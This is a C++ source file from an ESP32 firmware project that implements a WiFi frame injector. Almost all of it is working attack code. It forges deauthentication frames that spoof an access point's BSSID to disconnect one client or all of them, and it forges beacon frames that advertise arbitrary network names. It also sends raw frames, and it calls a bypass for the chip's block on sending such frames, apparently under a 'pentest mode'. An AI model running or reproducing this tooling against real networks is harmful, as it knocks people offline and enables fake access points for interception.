// Copyright 2025 XiaoZhi ESP32 Project
// WiFi Frame Injector Implementation

#include "wifi_frame_injector.h"

#include <cstring>
#include <vector>

#include "esp_log.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "wifi_coordinator.h"

extern "C" {
#include "wsl_bypasser.h"
}

static const char* TAG = "FrameInjector";

namespace xiaozhi {

// RateLimiter implementation
RateLimiter::RateLimiter(uint32_t max_fps)
    : max_fps_(max_fps) {
  frame_interval_us_ = 1000000 / max_fps_;
}

void RateLimiter::WaitIfNeeded() {
  if (last_frame_time_us_ == 0) {
    last_frame_time_us_ = esp_timer_get_time();
    return;
  }
  
  int64_t now = esp_timer_get_time();
  int64_t elapsed = now - last_frame_time_us_;
  
  if (elapsed < frame_interval_us_) {
    int64_t wait_us = frame_interval_us_ - elapsed;
    if (wait_us > 0) {
      esp_rom_delay_us(wait_us);
    }
  }
  
  last_frame_time_us_ = esp_timer_get_time();
}

void RateLimiter::Reset() {
  last_frame_time_us_ = 0;
}

void RateLimiter::SetMaxFps(uint32_t max_fps) {
  max_fps_ = max_fps;
  frame_interval_us_ = 1000000 / max_fps_;
  Reset();
}

// WifiFrameInjector implementation
WifiFrameInjector::WifiFrameInjector()
    : rate_limiter_(50) {  // Default 50 FPS
}

WifiFrameInjector::~WifiFrameInjector() {
  Shutdown();
}

esp_err_t WifiFrameInjector::Initialize() {
  if (initialized_) {
    return ESP_OK;
  }

  ESP_LOGI(TAG, "Initializing WiFi Frame Injector");

  // Initialize WSL bypasser (confirms it's active)
  wsl_bypasser_init();

  // Use coordinator's reference-counted promiscuous mode
  auto& coordinator = WifiCoordinator::GetInstance();
  esp_err_t ret = coordinator.EnablePromiscuous();
  if (ret != ESP_OK) {
    ESP_LOGE(TAG, "Failed to enable promiscuous via coordinator: %s", esp_err_to_name(ret));
    return ret;
  }

  promiscuous_enabled_ = true;
  initialized_ = true;

  ESP_LOGI(TAG, "Frame injector initialized (promiscuous via coordinator, ref count: %d)",
           coordinator.GetPromiscuousRefCount());
  return ESP_OK;
}

void WifiFrameInjector::Shutdown() {
  if (!initialized_) return;

  ESP_LOGI(TAG, "Shutting down frame injector");

  // Use coordinator's reference-counted promiscuous mode
  if (promiscuous_enabled_) {
    auto& coordinator = WifiCoordinator::GetInstance();
    coordinator.DisablePromiscuous();
    promiscuous_enabled_ = false;
    ESP_LOGI(TAG, "Promiscuous disabled via coordinator (remaining ref count: %d)",
             coordinator.GetPromiscuousRefCount());
  }

  initialized_ = false;
}

esp_err_t WifiFrameInjector::SetChannel(uint8_t channel) {
  if (channel < 1 || channel > 13) {
    ESP_LOGE(TAG, "Invalid channel: %d", channel);
    return ESP_ERR_INVALID_ARG;
  }

  // Use coordinator's SetChannel (handles deauth in pentest mode)
  auto& coordinator = WifiCoordinator::GetInstance();
  esp_err_t ret = coordinator.SetChannel(channel);
  if (ret != ESP_OK) {
    ESP_LOGE(TAG, "Failed to set channel via coordinator: %s", esp_err_to_name(ret));
    return ret;
  }

  current_channel_ = channel;
  ESP_LOGI(TAG, "Channel set to %d via coordinator", channel);
  return ESP_OK;
}

uint16_t WifiFrameInjector::GetNextSequenceNumber() {
  uint16_t seq = sequence_number_;
  sequence_number_ = (sequence_number_ + 1) & 0x0FFF;
  return seq << 4;  // Sequence number is in bits 4-15
}

void WifiFrameInjector::BuildDeauthFrame(DeauthFrame& frame,
                                          const uint8_t* target_bssid,
                                          const uint8_t* client_mac) {
  std::memset(&frame, 0, sizeof(frame));
  
  // Frame control: Management (0x00) + Deauthentication (0xC0)
  frame.frame_control[0] = 0xC0;
  frame.frame_control[1] = 0x00;
  
  // Duration
  frame.duration[0] = 0x00;
  frame.duration[1] = 0x00;
  
  // Destination: broadcast or specific client
  if (client_mac) {
    std::memcpy(frame.destination, client_mac, 6);
  } else {
    std::memset(frame.destination, 0xFF, 6);  // Broadcast
  }
  
  // Source and BSSID: target AP
  std::memcpy(frame.source, target_bssid, 6);
  std::memcpy(frame.bssid, target_bssid, 6);
  
  // Sequence number
  uint16_t seq = GetNextSequenceNumber();
  frame.sequence[0] = seq & 0xFF;
  frame.sequence[1] = (seq >> 8) & 0xFF;
  
  // Reason code: Class 3 frame received from nonassociated STA
  frame.reason_code[0] = 0x07;
  frame.reason_code[1] = 0x00;
}

esp_err_t WifiFrameInjector::InjectDeauthFrame(const uint8_t* target_bssid,
                                                 const uint8_t* client_mac) {
  if (!initialized_) {
    return ESP_ERR_INVALID_STATE;
  }
  
  DeauthFrame frame;
  BuildDeauthFrame(frame, target_bssid, client_mac);
  
  // Rate limiting
  rate_limiter_.WaitIfNeeded();
  
  // Inject frame
  esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
  
  if (ret == ESP_OK) {
    frames_sent_++;
  } else {
    errors_++;
  }
  
  return ret;
}

std::vector<uint8_t> WifiFrameInjector::BuildBeaconFrame(const uint8_t* bssid,
                                                          const char* ssid,
                                                          uint8_t channel) {
  std::vector<uint8_t> frame;
  
  // Beacon header
  BeaconFrameHeader header;
  std::memset(&header, 0, sizeof(header));
  
  // Frame control: Management (0x00) + Beacon (0x80)
  header.frame_control[0] = 0x80;
  header.frame_control[1] = 0x00;
  
  // Duration
  header.duration[0] = 0x00;
  header.duration[1] = 0x00;
  
  // Destination: broadcast
  std::memset(header.destination, 0xFF, 6);
  
  // Source and BSSID
  std::memcpy(header.source, bssid, 6);
  std::memcpy(header.bssid, bssid, 6);
  
  // Sequence number
  uint16_t seq = GetNextSequenceNumber();
  header.sequence[0] = seq & 0xFF;
  header.sequence[1] = (seq >> 8) & 0xFF;
  
  // Timestamp (8 bytes)
  int64_t timestamp = esp_timer_get_time();
  std::memcpy(header.timestamp, &timestamp, 8);
  
  // Beacon interval: 100 TU (102.4ms)
  header.beacon_interval = 100;
  
  // Capability: ESS (0x0001)
  header.capability = 0x0001;
  
  // Add header to frame
  uint8_t* header_bytes = reinterpret_cast<uint8_t*>(&header);
  frame.insert(frame.end(), header_bytes, header_bytes + sizeof(header));
  
  // SSID IE (Tag 0)
  size_t ssid_len = std::strlen(ssid);
  frame.push_back(0x00);  // Tag: SSID
  frame.push_back(ssid_len);  // Length
  frame.insert(frame.end(), ssid, ssid + ssid_len);
  
  // Supported rates IE (Tag 1)
  uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
  frame.push_back(0x01);  // Tag: Supported Rates
  frame.push_back(sizeof(rates));
  frame.insert(frame.end(), rates, rates + sizeof(rates));
  
  // DS Parameter Set (Tag 3)
  frame.push_back(0x03);  // Tag: DS Parameter
  frame.push_back(0x01);  // Length
  frame.push_back(channel);
  
  return frame;
}

esp_err_t WifiFrameInjector::InjectBeaconFrame(const uint8_t* bssid,
                                                 const char* ssid,
                                                 uint8_t channel) {
  if (!initialized_) {
    return ESP_ERR_INVALID_STATE;
  }
  
  std::vector<uint8_t> frame = BuildBeaconFrame(bssid, ssid, channel);
  
  // Rate limiting
  rate_limiter_.WaitIfNeeded();
  
  // Inject frame
  esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, frame.data(), frame.size(), false);
  
  if (ret == ESP_OK) {
    frames_sent_++;
  } else {
    errors_++;
  }
  
  return ret;
}

esp_err_t WifiFrameInjector::InjectRawFrame(const uint8_t* frame, size_t length) {
  if (!initialized_) {
    return ESP_ERR_INVALID_STATE;
  }
  
  if (!frame || length == 0) {
    return ESP_ERR_INVALID_ARG;
  }
  
  // Rate limiting
  rate_limiter_.WaitIfNeeded();
  
  // Inject frame
  esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, frame, length, false);
  
  if (ret == ESP_OK) {
    frames_sent_++;
  } else {
    errors_++;
  }
  
  return ret;
}

void WifiFrameInjector::SetFrameRate(uint32_t fps) {
  rate_limiter_.SetMaxFps(fps);
  ESP_LOGI(TAG, "Frame rate set to %lu FPS", fps);
}

void WifiFrameInjector::ResetStats() {
  frames_sent_ = 0;
  errors_ = 0;
}

esp_err_t WifiFrameInjector::GetDeviceMac(uint8_t* mac) {
  return esp_wifi_get_mac(WIFI_IF_STA, mac);
}

}  // namespace xiaozhi
